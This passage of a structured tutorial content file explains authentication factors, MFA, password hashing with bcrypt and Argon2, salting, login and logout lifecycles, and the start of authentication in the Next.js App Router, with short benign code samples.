            type: "paragraph",
            content: "Something You Are"
          },
          {
            type: "paragraph",
            content: "Biometric credentials."
          },
          {
            type: "paragraph",
            content: "Examples:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Fingerprint",
              "Face recognition",
              "Retina scan",
              "Voice recognition"
            ]
          }
        ]
      },
      {
        heading: "Authentication Factors",
        blocks: [
          {
            type: "paragraph",
            content: "Security experts classify credentials into factors:"
          },
          {
            type: "table",
            headers: ["Factor", "Example"],
            rows: [
              ["Knowledge", "Password"],
              ["Possession", "Phone"],
              ["Inherence", "Fingerprint"]
            ]
          },
          {
            type: "paragraph",
            content: "Using more than one factor increases security."
          }
        ]
      },
      {
        heading: "Username & Password Authentication",
        blocks: [
          {
            type: "paragraph",
            content: "The most common authentication system on the internet uses:"
          },
          {
            type: "output",
            content: [
              "Username",
              "+",
              "Password"
            ]
          },
          {
            type: "paragraph",
            content: "It is simple, familiar, and widely supported."
          }
        ]
      },
      {
        heading: "How Username & Password Authentication Works",
        blocks: [
          {
            type: "flow",
            steps: [
              "User", "→",
              "Username", "→",
              "Password", "→",
              "HTTPS Request", "→",
              "Server", "→",
              "Database Lookup", "→",
              "Hash Password", "→",
              "Compare Hashes", "→",
              "Authenticated"
            ]
          },
          {
            type: "paragraph",
            content: "The password itself is never stored in plain text."
          },
          {
            type: "paragraph",
            content: "Only its cryptographic hash is stored. You'll learn password hashing and salting in the next response."
          }
        ]
      },
      {
        heading: "Why Passwords Are Popular",
        blocks: [
          {
            type: "paragraph",
            content: "Advantages:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Easy to implement",
              "Familiar to users",
              "Low cost",
              "Universal support"
            ]
          },
          {
            type: "paragraph",
            content: "Disadvantages:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Weak passwords",
              "Password reuse",
              "Phishing",
              "Brute-force attacks",
              "Credential stuffing"
            ]
          },
          {
            type: "paragraph",
            content: "Because of these weaknesses, modern applications often combine passwords with additional factors."
          }
        ]
      },
      {
        heading: "Multi-Factor Authentication (MFA)",
        blocks: [
          {
            type: "paragraph",
            content: "Multi-Factor Authentication (MFA) requires users to present two or more independent authentication factors before access is granted."
          },
          {
            type: "paragraph",
            content: "Instead of relying solely on a password, the system verifies multiple forms of evidence."
          },
          {
            type: "paragraph",
            content: "For example:"
          },
          {
            type: "flow",
            steps: [
              "Email", "→",
              "Password", "→",
              "OTP", "→",
              "Authenticated"
            ]
          },
          {
            type: "paragraph",
            content: "Even if an attacker steals the password, they still need the second factor."
          }
        ]
      },
      {
        heading: "Common MFA Methods",
        blocks: [
          {
            type: "paragraph",
            content: "SMS OTP"
          },
          {
            type: "flow",
            steps: [
              "Password", "→",
              "Receive SMS", "→",
              "Enter OTP", "→",
              "Login"
            ]
          },
          {
            type: "paragraph",
            content: "Simple but vulnerable to SIM-swapping attacks."
          },
          {
            type: "paragraph",
            content: "Authenticator Apps"
          },
          {
            type: "paragraph",
            content: "Applications like:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Google Authenticator",
              "Microsoft Authenticator",
              "Authy"
            ]
          },
          {
            type: "paragraph",
            content: "generate time-based one-time passwords (TOTP) that refresh every 30 seconds."
          },
          {
            type: "paragraph",
            content: "These are more secure than SMS."
          },
          {
            type: "paragraph",
            content: "Push Notifications"
          },
          {
            type: "paragraph",
            content: "The server sends a login approval request to the user's phone."
          },
          {
            type: "paragraph",
            content: "The user taps Approve or Deny."
          },
          {
            type: "paragraph",
            content: "Security Keys"
          },
          {
            type: "paragraph",
            content: "Hardware devices (e.g., YubiKey) use standards like WebAuthn and FIDO2 to provide phishing-resistant authentication."
          },
          {
            type: "paragraph",
            content: "These are among the most secure MFA methods."
          },
          {
            type: "paragraph",
            content: "Biometrics"
          },
          {
            type: "paragraph",
            content: "Devices verify:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Fingerprint",
              "Face ID",
              "Iris scan"
            ]
          },
          {
            type: "paragraph",
            content: "Biometrics are convenient but are typically used alongside another authentication factor."
          }
        ]
      },
      {
        heading: "MFA Authentication Flow",
        blocks: [
          {
            type: "flow",
            steps: [
              "User", "→",
              "Username", "→",
              "Password", "→",
              "Password Verified", "→",
              "OTP Requested", "→",
              "Enter OTP", "→",
              "OTP Verified", "→",
              "Session Created", "→",
              "Authenticated"
            ]
          },
          {
            type: "paragraph",
            content: "If either factor fails, authentication is denied."
          }
        ]
      },
      {
        heading: "Benefits of MFA",
        blocks: [
          {
            type: "list",
            style: "unordered",
            items: [
              "Protects against stolen passwords.",
              "Reduces account takeover risks.",
              "Increases trust in user identity.",
              "Widely required for banking, healthcare, and enterprise applications.",
              "Significantly improves overall application security."
            ]
          }
        ]
      },
      {
        heading: "Challenges of MFA",
        blocks: [
          {
            type: "list",
            style: "unordered",
            items: [
              "Adds an extra login step.",
              "Users may lose access to their second factor.",
              "SMS-based MFA has known security weaknesses.",
              "Backup codes and recovery mechanisms are essential."
            ]
          }
        ]
      },
      {
        heading: "Real-World Authentication Methods",
        blocks: [
          {
            type: "table",
            headers: ["Service", "Authentication Method"],
            rows: [
              ["Gmail", "Password + Authenticator App"],
              ["GitHub", "Password + Passkey or Security Key"],
              ["Amazon", "Password + OTP"],
              ["Banking Apps", "Password + OTP/Biometrics"],
              ["Microsoft 365", "Password + Push Notification"],
              ["GitLab Enterprise", "Password + Security Key"]
            ]
          }
        ]
      },
      {
        heading: "DevSphere Special Insight",
        blocks: [
          {
            type: "note",
            content: "A common misconception is that \"authentication\" ends after a successful login. In reality, authentication is an ongoing verification process. Every request to a protected resource must prove the user's identity through a valid session or token. This continuous validation is what keeps applications secure throughout a user's interaction."
          }
        ]
      },

      {
        heading: "Password Hashing",
        blocks: [
          {
            type: "paragraph",
            content: "So far, we've learned that users authenticate using a username (or email) and password. But this raises an important question:"
          },
          {
            type: "output",
            content: [
              "Where does the server store user passwords?"
            ]
          },
          {
            type: "paragraph",
            content: "A beginner might think the server stores passwords exactly as users type them:"
          },
          {
            type: "table",
            headers: ["Username", "Password"],
            rows: [
              ["alice@example.com", "mypassword123"],
              ["bob@example.com", "qwerty456"],
              ["john@example.com", "ilovecoding"]
            ]
          },
          {
            type: "paragraph",
            content: "This would be a catastrophic security mistake."
          },
          {
            type: "paragraph",
            content: "If an attacker gained access to the database, they would immediately know every user's password."
          },
          {
            type: "paragraph",
            content: "Instead, modern applications never store plain-text passwords. They store a cryptographic hash of each password."
          },
          {
            type: "paragraph",
            content: "This process is called Password Hashing."
          }
        ]
      },
      {
        heading: "What is Password Hashing?",
        blocks: [
          {
            type: "paragraph",
            content: "Password hashing is the process of converting a password into a fixed-length, irreversible string using a cryptographic hash function."
          },
          {
            type: "paragraph",
            content: "Instead of storing:"
          },
          {
            type: "output",
            content: [
              "Password:",
              "myPassword123"
            ]
          },
          {
            type: "paragraph",
            content: "the server stores something like:"
          },
          {
            type: "output",
            content: [
              "$2b$12$WmL5PZq0v6A3..."
            ]
          },
          {
            type: "paragraph",
            content: "This seemingly random string is the password hash."
          },
          {
            type: "paragraph",
            content: "The original password cannot be recovered from the hash."
          }
        ]
      },
      {
        heading: "Hashing vs Encryption",
        blocks: [
          {
            type: "paragraph",
            content: "Many beginners confuse these terms."
          },
          {
            type: "paragraph",
            content: "They are fundamentally different."
          },
          {
            type: "table",
            headers: ["Hashing", "Encryption"],
            rows: [
              ["One-way", "Two-way"],
              ["Cannot recover original data", "Original data can be decrypted"],
              ["Used for passwords", "Used for secure communication"],
              ["No decryption key", "Requires encryption/decryption keys"]
            ]
          },
          {
            type: "paragraph",
            content: "Think of it like this:"
          },
          {
            type: "paragraph",
            content: "Encryption is locking a document in a safe—you can unlock it with the correct key."
          },
          {
            type: "paragraph",
            content: "Hashing is shredding the document into microscopic pieces—you cannot reconstruct it."
          }
        ]
      },
      {
        heading: "Properties of a Good Password Hash",
        blocks: [
          {
            type: "paragraph",
            content: "A secure password hashing algorithm should have these characteristics:"
          },
          {
            type: "paragraph",
            content: "One-way"
          },
          {
            type: "paragraph",
            content: "You cannot reverse the hash to obtain the password."
          },
          {
            type: "paragraph",
            content: "Deterministic"
          },
          {
            type: "paragraph",
            content: "The same password always produces the same hash (before salting)."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "Password: hello123", "→",
              "Hash: A8F9B..."
            ]
          },
          {
            type: "paragraph",
            content: "Every time the same password is hashed (without a salt), it produces the same output."
          },
          {
            type: "paragraph",
            content: "Avalanche Effect"
          },
          {
            type: "paragraph",
            content: "Even a tiny password change creates a completely different hash."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "hello123", "→",
              "2A8BC..."
            ]
          },
          {
            type: "flow",
            steps: [
              "hello124", "→",
              "FF8DA..."
            ]
          },
          {
            type: "paragraph",
            content: "Notice how changing a single character produces a completely unrelated hash."
          },
          {
            type: "paragraph",
            content: "Fixed Length"
          },
          {
            type: "paragraph",
            content: "Regardless of password length, the hash output has a predictable size for a given algorithm."
          }
        ]
      },
      {
        heading: "Why Not Store Plain Passwords?",
        blocks: [
          {
            type: "paragraph",
            content: "Imagine an application with one million users."
          },
          {
            type: "paragraph",
            content: "If passwords were stored like this:"
          },
          {
            type: "table",
            headers: ["Email", "Password"],
            rows: [
              ["alice@gmail.com", "hello123"],
              ["bob@gmail.com", "qwerty"],
              ["john@gmail.com", "password"]
            ]
          },
          {
            type: "paragraph",
            content: "A database leak would expose every account instantly."
          },
          {
            type: "paragraph",
            content: "Since many people reuse passwords across websites, attackers could compromise:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Email accounts",
              "Banking apps",
              "Social media",
              "Cloud storage",
              "Shopping sites"
            ]
          },
          {
            type: "paragraph",
            content: "A single breach could affect millions of accounts across the internet."
          },
          {
            type: "paragraph",
            content: "Password hashing prevents this."
          }
        ]
      },
      {
        heading: "How Password Hashing Works",
        blocks: [
          {
            type: "paragraph",
            content: "During registration:"
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Password", "→",
              "Hash Function", "→",
              "Password Hash", "→",
              "Database"
            ]
          },
          {
            type: "paragraph",
            content: "During login:"
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Password", "→",
              "Hash Function", "→",
              "Generated Hash", "→",
              "Compare", "→",
              "Stored Hash", "→",
              "Match?", "→",
              "Login Success"
            ]
          },
          {
            type: "paragraph",
            content: "Notice that the original password is never retrieved from the database."
          },
          {
            type: "paragraph",
            content: "Instead, the server hashes the entered password again and compares the hashes."
          }
        ]
      },
      {
        heading: "Example Registration Flow",
        blocks: [
          {
            type: "paragraph",
            content: "Suppose the user enters:"
          },
          {
            type: "output",
            content: [
              "Password:",
              "DevSphere@123"
            ]
          },
          {
            type: "paragraph",
            content: "The server performs:"
          },
          {
            type: "flow",
            steps: [
              "DevSphere@123", "→",
              "Hash Function", "→",
              "$2b$12$Ks7y...."
            ]
          },
          {
            type: "paragraph",
            content: "Database:"
          },
          {
            type: "table",
            headers: ["Email", "Password Hash"],
            rows: [
              ["faiz@example.com", "$2b$12$Ks7y..."]
            ]
          },
          {
            type: "paragraph",
            content: "The plain password is discarded immediately after hashing."
          }
        ]
      },
      {
        heading: "Example Login Flow",
        blocks: [
          {
            type: "paragraph",
            content: "User enters:"
          },
          {
            type: "output",
            content: [
              "Password:",
              "DevSphere@123"
            ]
          },
          {
            type: "paragraph",
            content: "Server:"
          },
          {
            type: "flow",
            steps: [
              "Hash(User Password)", "→",
              "$2b$12$Ks7y..."
            ]
          },
          {
            type: "paragraph",
            content: "Database:"
          },
          {
            type: "flow",
            steps: [
              "Stored Hash", "→",
              "$2b$12$Ks7y..."
            ]
          },
          {
            type: "paragraph",
            content: "Hashes match."
          },
          {
            type: "paragraph",
            content: "Authentication succeeds."
          }
        ]
      },
      {
        heading: "bcrypt",
        blocks: [
          {
            type: "paragraph",
            content: "For many years, bcrypt has been the industry standard for password hashing."
          },
          {
            type: "paragraph",
            content: "It was specifically designed to slow down password cracking."
          },
          {
            type: "paragraph",
            content: "Unlike general-purpose hash algorithms such as SHA-256, bcrypt is intentionally computationally expensive."
          }
        ]
      },
      {
        heading: "Why bcrypt is Secure",
        blocks: [
          {
            type: "paragraph",
            content: "bcrypt includes:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Automatic salting",
              "Adjustable work factor (cost)",
              "Slow computation",
              "Resistance to rainbow table attacks"
            ]
          }
        ]
      },
      {
        heading: "bcrypt Workflow",
        blocks: [
          {
            type: "flow",
            steps: [
              "Password", "→",
              "Generate Salt", "→",
              "Combine Password + Salt", "→",
              "bcrypt Algorithm", "→",
              "Password Hash"
            ]
          }
        ]
      },
      {
        heading: "Cost Factor",
        blocks: [
          {
            type: "paragraph",
            content: "bcrypt allows developers to adjust how much computation is required."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "Cost = 10", "→",
              "~100 ms"
            ]
          },
          {
            type: "flow",
            steps: [
              "Cost = 14", "→",
              "Much slower"
            ]
          },
          {
            type: "paragraph",
            content: "Higher costs increase security but also increase login time."
          },
          {
            type: "paragraph",
            content: "A balanced cost is chosen based on server performance."
          }
        ]
      },
      {
        heading: "Example (Node.js)",
        blocks: [
          {
            type: "code",
            language: "javascript",
            content: `import bcrypt from "bcrypt";

const password = "DevSphere@123";

// Hash password
const hash = await bcrypt.hash(password, 12);

// Verify password
const isValid = await bcrypt.compare(password, hash);

console.log(isValid); // true`
          },
          {
            type: "paragraph",
            content: "Notice that you never compare plain-text passwords manually—bcrypt.compare() performs the secure comparison."
          }
        ]
      },
      {
        heading: "Argon2",
        blocks: [
          {
            type: "paragraph",
            content: "While bcrypt remains widely used, Argon2 is considered the modern successor."
          },
          {
            type: "paragraph",
            content: "Argon2 won the Password Hashing Competition (PHC) in 2015 and is designed to resist modern hardware attacks."
          },
          {
            type: "paragraph",
            content: "It offers stronger protection against GPUs, ASICs, and large-scale parallel password cracking."
          }
        ]
      },
      {
        heading: "Why Argon2?",
        blocks: [
          {
            type: "paragraph",
            content: "Argon2 provides:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Memory-hard computation",
              "Configurable time cost",
              "Configurable memory cost",
              "Configurable parallelism",
              "Better resistance to GPU attacks"
            ]
          }
        ]
      },
      {
        heading: "Argon2 Workflow",
        blocks: [
          {
            type: "flow",
            steps: [
              "Password", "→",
              "Generate Salt", "→",
              "Allocate Memory", "→",
              "Perform Multiple Hashing Passes", "→",
              "Password Hash"
            ]
          },
          {
            type: "paragraph",
            content: "Unlike bcrypt, Argon2 deliberately consumes significant memory, making specialized cracking hardware much less effective."
          }
        ]
      },
      {
        heading: "Types of Argon2",
        blocks: [
          {
            type: "table",
            headers: ["Variant", "Purpose"],
            rows: [
              ["Argon2d", "Maximum GPU resistance"],
              ["Argon2i", "Better protection against side-channel attacks"],
              ["Argon2id", "Hybrid approach (recommended for most applications)"]
            ]
          },
          {
            type: "paragraph",
            content: "Most production applications choose Argon2id."
          }
        ]
      },
      {
        heading: "Example (Node.js)",
        blocks: [
          {
            type: "code",
            language: "javascript",
            content: `import argon2 from "argon2";

const hash = await argon2.hash("DevSphere@123");

const verified = await argon2.verify(hash, "DevSphere@123");

console.log(verified); // true`
          }
        ]
      },
      {
        heading: "bcrypt vs Argon2",
        blocks: [
          {
            type: "table",
            headers: ["Feature", "bcrypt", "Argon2"],
            rows: [
              ["Introduced", "1999", "2015"],
              ["Automatic Salt", "✅ Yes", "✅ Yes"],
              ["Memory Hard", "❌ No", "✅ Yes"],
              ["GPU Resistance", "Moderate", "Excellent"],
              ["Adjustable Cost", "✅ Yes", "✅ Yes"],
              ["Adjustable Memory", "❌ No", "✅ Yes"],
              ["Recommended Today", "Good", "Best (Argon2id)"]
            ]
          },
          {
            type: "paragraph",
            content: "Both are secure choices, but Argon2id is generally recommended for new applications where supported."
          }
        ]
      },
      {
        heading: "What is Salting?",
        blocks: [
          {
            type: "paragraph",
            content: "Imagine two users choose the same password:"
          },
          {
            type: "output",
            content: [
              "Password123"
            ]
          },
          {
            type: "paragraph",
            content: "Without salting:"
          },
          {
            type: "flow",
            steps: [
              "Hash", "→",
              "ABC123XYZ"
            ]
          },
          {
            type: "paragraph",
            content: "Both users would have identical hashes."
          },
          {
            type: "paragraph",
            content: "An attacker could immediately see that they share the same password."
          },
          {
            type: "paragraph",
            content: "This is undesirable."
          },
          {
            type: "paragraph",
            content: "To solve this, we use Salting."
          }
        ]
      },
      {
        heading: "What is a Salt?",
        blocks: [
          {
            type: "paragraph",
            content: "A salt is a unique random value generated for each password before hashing."
          },
          {
            type: "paragraph",
            content: "Instead of hashing:"
          },
          {
            type: "output",
            content: [
              "Password123"
            ]
          },
          {
            type: "paragraph",
            content: "the server hashes:"
          },
          {
            type: "output",
            content: [
              "Password123 + RandomSalt"
            ]
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "Password:",
              "Password123",
              "",
              "Salt:",
              "Q8K91M"
            ]
          },
          {
            type: "flow",
            steps: [
              "Password123Q8K91M", "→",
              "Hash"
            ]
          },
          {
            type: "paragraph",
            content: "Each user receives a different salt."
          }
        ]
      },
      {
        heading: "Why Salting is Important",
        blocks: [
          {
            type: "paragraph",
            content: "Suppose:"
          },
          {
            type: "paragraph",
            content: "Alice:"
          },
          {
            type: "output",
            content: [
              "Password123"
            ]
          },
          {
            type: "paragraph",
            content: "Bob:"
          },
          {
            type: "output",
            content: [
              "Password123"
            ]
          },
          {
            type: "paragraph",
            content: "Without salt:"
          },
          {
            type: "flow",
            steps: [
              "Hash", "→",
              "ABCXYZ"
            ]
          },
          {
            type: "paragraph",
            content: "Both hashes are identical."
          },
          {
            type: "paragraph",
            content: "With unique salts:"
          },
          {
            type: "paragraph",
            content: "Alice:"
          },
          {
            type: "flow",
            steps: [
              "Password123 + SaltA", "→",
              "Hash1"
            ]
          },
          {
            type: "paragraph",
            content: "Bob:"
          },
          {
            type: "flow",
            steps: [
              "Password123 + SaltB", "→",
              "Hash2"
            ]
          },
          {
            type: "paragraph",
            content: "Even though the passwords are identical, the hashes are completely different."
          }
        ]
      },
      {
        heading: "Protection Against Rainbow Tables",
        blocks: [
          {
            type: "paragraph",
            content: "A rainbow table is a precomputed database of common password hashes."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "table",
            headers: ["Password", "Hash"],
            rows: [
              ["password", "X123"],
              ["hello123", "Y456"],
              ["admin", "Z789"]
            ]
          },
          {
            type: "paragraph",
            content: "Without salts, attackers can quickly match stolen hashes against these tables."
          },
          {
            type: "paragraph",
            content: "Unique salts make rainbow tables practically useless because each password hash becomes unique."
          }
        ]
      },
      {
        heading: "Login Request Lifecycle",
        blocks: [
          {
            type: "paragraph",
            content: "Now let's examine everything that happens during a login request in a production application."
          }
        ]
      },
      {
        heading: "Step 1 — User Opens Login Page",
        blocks: [
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "/login"
            ]
          },
          {
            type: "paragraph",
            content: "The server returns the login form."
          }
        ]
      },
      {
        heading: "Step 2 — User Enters Credentials",
        blocks: [
          {
            type: "output",
            content: [
              "Email",
              "",
              "Password"
            ]
          },
          {
            type: "paragraph",
            content: "The browser validates basic requirements, such as required fields and email format."
          }
        ]
      },
      {
        heading: "Step 3 — HTTPS Login Request",
        blocks: [
          {
            type: "code",
            language: "json",
            content: `POST /login

{
  "email":"alice@example.com",
  "password":"DevSphere@123"
}`
          },
          {
            type: "paragraph",
            content: "This request must always be sent over HTTPS."
          }
        ]
      },
      {
        heading: "Step 4 — Server Validates Input",
        blocks: [
          {
            type: "paragraph",
            content: "The server checks:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Missing fields",
              "Invalid email format",
              "Input length",
              "Request size",
              "Malicious payloads"
            ]
          },
          {
            type: "paragraph",
            content: "Never rely solely on client-side validation."
          }
        ]
      },
      {
        heading: "Step 5 — User Lookup",
        blocks: [
          {
            type: "paragraph",
            content: "The server searches the database:"
          },
          {
            type: "code",
            language: "sql",
            content: `SELECT * FROM users
WHERE email='alice@example.com';`
          },
          {
            type: "paragraph",
            content: "If no user exists:"
          },
          {
            type: "output",
            content: [
              "Invalid credentials."
            ]
          },
          {
            type: "paragraph",
            content: "Avoid revealing whether the email exists to prevent user enumeration attacks."
          }
        ]
      },
      {
        heading: "Step 6 — Password Verification",
        blocks: [
          {
            type: "paragraph",
            content: "The stored password hash is retrieved."
          },
          {
            type: "paragraph",
            content: "The server uses bcrypt or Argon2 to verify the submitted password against the stored hash."
          }
        ]
      },
      {
        heading: "Step 7 — Optional MFA Verification",
        blocks: [
          {
            type: "paragraph",
            content: "If Multi-Factor Authentication is enabled:"
          },
          {
            type: "flow",
            steps: [
              "Password Correct", "→",
              "Send OTP", "→",
              "Verify OTP", "→",
              "Continue"
            ]
          }
        ]
      },
      {
        heading: "Step 8 — Create Authentication State",
        blocks: [
          {
            type: "paragraph",
            content: "Depending on the chosen strategy:"
          },
          {
            type: "paragraph",
            content: "Stateful:"
          },
          {
            type: "flow",
            steps: [
              "Create Session", "→",
              "Store Session", "→",
              "Return Cookie"
            ]
          },
          {
            type: "paragraph",
            content: "Stateless:"
          },
          {
            type: "flow",
            steps: [
              "Create JWT", "→",
              "Return Token"
            ]
          }
        ]
      },
      {
        heading: "Step 9 — Send Response",
        blocks: [
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "HTTP/1.1 200 OK",
              "",
              "Set-Cookie:",
              "session=abc123..."
            ]
          },
          {
            type: "paragraph",
            content: "or"
          },
          {
            type: "code",
            language: "json",
            content: `{
  "accessToken":"..."
}`
          }
        ]
      },
      {
        heading: "Step 10 — Access Protected Pages",
        blocks: [
          {
            type: "paragraph",
            content: "Future requests include:"
          },
          {
            type: "output",
            content: [
              "Cookie",
              "or",
              "JWT"
            ]
          },
          {
            type: "paragraph",
            content: "The server verifies this proof before serving protected resources."
          }
        ]
      },
      {
        heading: "Complete Login Lifecycle",
        blocks: [
          {
            type: "flow",
            steps: [
              "User", "→",
              "Enter Credentials", "→",
              "Browser Validation", "→",
              "HTTPS Request", "→",
              "Server Validation", "→",
              "Database Lookup", "→",
              "Password Verification", "→",
              "MFA (Optional)", "→",
              "Session/JWT Creation", "→",
              "Authentication Cookie/Token", "→",
              "Protected Application"
            ]
          }
        ]
      },
      {
        heading: "Logout Lifecycle",
        blocks: [
          {
            type: "paragraph",
            content: "Logging out is more than redirecting users to the login page. A secure logout ensures that any authentication proof can no longer be used."
          }
        ]
      },
      {
        heading: "Step 1 — User Clicks Logout",
        blocks: [
          {
            type: "flow",
            steps: [
              "Logout Button", "→",
              "POST /logout"
            ]
          },
          {
            type: "paragraph",
            content: "Using POST helps prevent accidental logouts through simple links."
          }
        ]
      },
      {
        heading: "Step 2 — Server Receives Request",
        blocks: [
          {
            type: "paragraph",
            content: "The server identifies the current session or token."
          }
        ]
      },
      {
        heading: "Step 3 — Invalidate Authentication",
        blocks: [
          {
            type: "paragraph",
            content: "For stateful authentication:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Delete the session from the session store.",
              "Expire the session cookie."
            ]
          },
          {
            type: "paragraph",
            content: "For stateless authentication (JWT):"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Remove the token from the client.",
              "Optionally add refresh tokens to a revocation list if your architecture supports it."
            ]
          }
        ]
      },
      {
        heading: "Step 4 — Clear Client Storage",
        blocks: [
          {
            type: "paragraph",
            content: "The browser removes:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Session cookies (if applicable)",
              "Stored access tokens",
              "Stored refresh tokens",
              "Cached user-specific state (when appropriate)"
            ]
          }
        ]
      },
      {
        heading: "Step 5 — Redirect",
        blocks: [
          {
            type: "paragraph",
            content: "The user is redirected to:"
          },
          {
            type: "output",
            content: [
              "/login",
              "or",
              "/"
            ]
          }
        ]
      },
      {
        heading: "Logout Flow Diagram",
        blocks: [
          {
            type: "flow",
            steps: [
              "Authenticated User", "→",
              "Click Logout", "→",
              "POST /logout", "→",
              "Server Invalidates Session/Token", "→",
              "Clear Cookies / Tokens", "→",
              "Redirect to Login Page", "→",
              "Protected Routes Now Require Authentication"
            ]
          }
        ]
      },
      {
        heading: "Security Best Practices",
        blocks: [
          {
            type: "paragraph",
            content: "When implementing authentication in Next.js or any web application:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Never store plain-text passwords.",
              "Prefer Argon2id for new projects, or bcrypt where Argon2 isn't available.",
              "Use a unique, cryptographically secure salt for every password (bcrypt and Argon2 handle this automatically).",
              "Always transmit credentials over HTTPS.",
              "Never reveal whether a username or email exists during login failures.",
              "Use secure, HttpOnly, Secure, and appropriate SameSite cookie settings for session cookies.",
              "Implement rate limiting and temporary account lockouts to reduce brute-force attacks.",
              "Encourage or require MFA for sensitive accounts.",
              "Log authentication events without recording passwords or other secrets.",
              "Provide secure account recovery mechanisms."
            ]
          }
        ]
      },

      {
        heading: "Authentication in Next.js",
        blocks: [
          {
            type: "paragraph",
            content: "Up to this point, you've learned authentication as a general computer science concept. Now it's time to understand how authentication fits into the Next.js architecture."
          },
          {
            type: "paragraph",
            content: "Authentication in Next.js is fundamentally different from authentication in traditional React applications because Next.js has both a frontend and a backend."
          },
          {
            type: "paragraph",
            content: "Instead of relying solely on external APIs, Next.js can:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Render login pages",
              "Validate user credentials",
              "Access databases",
              "Create sessions or JWTs",
              "Set secure cookies",
              "Protect routes",
              "Execute middleware",
              "Perform authorization",
              "Render authenticated content on the server"
            ]
          },
          {
            type: "paragraph",
            content: "This makes authentication simpler, faster, and more secure."
          }
        ]
      },
      {
        heading: "Why Authentication is Different in Next.js",
        blocks: [
          {
            type: "paragraph",
            content: "A traditional React application usually looks like this:"
          },
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "React App", "→",
              "REST API", "→",
              "Authentication Server", "→",
              "Database"
            ]
          },
          {
            type: "paragraph",
            content: "The frontend cannot directly access databases or securely verify passwords. Everything must go through an external backend."
          },
          {
            type: "paragraph",
            content: "In contrast, a Next.js application includes both UI and server capabilities:"
          },
          {
            type: "code",
            language: "text",
            content: `Browser
   │
   ▼
Next.js Application
   ├──────────────┐
   │              │
   ▼              ▼
React UI     Server Logic
                  │
                  ▼
             Database`
          },
          {
            type: "paragraph",
            content: "Because the server is built into the application, authentication logic can live alongside the UI."
          }
        ]
      },
      {
        heading: "Authentication Building Blocks in Next.js",
        blocks: [
          {
            type: "paragraph",
            content: "A production authentication system typically consists of these components:"
          },
          {
            type: "flow",
            steps: [
              "Login Page", "→",
              "Server Action / API Route / Route Handler", "→",
              "Database", "→",
              "Password Verification", "→",
              "Session or JWT Creation", "→",
              "Cookie Storage", "→",
              "Middleware", "→",
              "Protected Pages"
            ]
          },
          {
            type: "paragraph",
            content: "Each component has a specific responsibility:"
          },
          {
            type: "table",
            headers: [
              "Component",
              "Responsibility"
            ],
            rows: [
              [
                "Login Page",
                "Collect user credentials"
              ],
              [
                "Server Logic",
                "Verify credentials"
              ],
              [
                "Database",
                "Store user records"
              ],
              [
                "Session/JWT",
                "Remember authenticated users"
              ],
              [
                "Cookies",
                "Carry authentication information"
              ],
              [
                "Middleware",
                "Protect routes"
              ],
              [
                "Protected Pages",
                "Serve authenticated content"
              ]
            ]
          }
        ]
      },
      {
        heading: "Authentication Workflow in Next.js",
        blocks: [
          {
            type: "paragraph",
            content: "Let's walk through a complete authentication flow."
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Login Form", "→",
              "Submit Credentials", "→",
              "Server Validates Input", "→",
              "Database Lookup", "→",
              "Password Verification", "→",
              "Create Session/JWT", "→",
              "Set Cookie", "→",
              "Redirect Dashboard", "→",
              "Protected Pages"
            ]
          },
          {
            type: "paragraph",
            content: "Every authenticated request after login includes the session cookie or token, allowing the server to verify the user's identity before serving content."
          }
        ]
      },
      {
        heading: "Authentication in the App Router",
        blocks: [
          {
            type: "paragraph",
            content: "The App Router is the modern routing system introduced in Next.js 13+."
          },
          {
            type: "paragraph",
            content: "It was designed with Server Components, Server Actions, streaming, and React Server Components (RSC) in mind."
          },
          {
            type: "paragraph",
            content: "Authentication integrates naturally with these features."
          }
        ]
      },
      {
        heading: "Typical App Router Structure",
        blocks: [
          {
            type: "tree",
            content: `app/
│
├── login/
│   └── page.tsx
│
├── dashboard/
│   └── page.tsx
│
├── profile/
│   └── page.tsx
│
├── api/
│   └── auth/
│
├── middleware.ts
│
└── layout.tsx`
          }
        ]
      },
      {
        heading: "Authentication Flow in the App Router",
        blocks: [
          {
            type: "flow",
            steps: [
              "User", "→",
              "app/login/page.tsx", "→",
              "Server Action", "→",
              "Database", "→",
              "Verify Password", "→",
              "Create Session", "→",
              "Set Cookie", "→",
              "Middleware", "→",
              "Dashboard"
            ]
          },
          {
            type: "paragraph",
            content: "Notice that Server Actions can handle form submission without creating separate API endpoints."
          }
        ]
      },
      {
        heading: "Server Actions for Login",
        blocks: [
          {
            type: "paragraph",
            content: "One of the biggest improvements in the App Router is the ability to authenticate users directly through Server Actions."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "typescript",
            content: `// app/actions.ts
"use server";

import { redirect } from "next/navigation";

export async function login(formData: FormData) {
  const email = formData.get("email");
  const password = formData.get("password");

  // Validate credentials
  // Query database
  // Verify password

  // Create session

  redirect("/dashboard");
}`
          },
          {
            type: "paragraph",
            content: "Login form:"
          },
          {
            type: "code",
            language: "jsx",
            content: `<form action={login}>
  <input name="email" />
  <input
    name="password"
    type="password"
  />

  <button>Login</button>
</form>`
          },
          {
            type: "paragraph",
